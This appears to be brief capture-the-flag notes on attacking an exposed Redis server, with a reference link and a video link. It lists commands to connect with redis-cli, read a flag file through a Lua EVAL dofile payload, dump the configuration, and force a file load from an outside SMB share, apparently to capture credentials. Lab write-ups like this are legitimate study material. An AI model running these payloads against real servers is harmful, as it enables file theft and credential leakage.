<https://book.hacktricks.xyz/pentesting/6379-pentesting-redis>
<https://youtu.be/VgMoQWN5UfM?t=262>

Access:
redis-cli -h vulnnet.local

Get user.txt:
EVAL “dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')” 0

Get config info: (could reveal some useful info)
config get *

EVAL “dofile('//10.13.31.108/share')” 0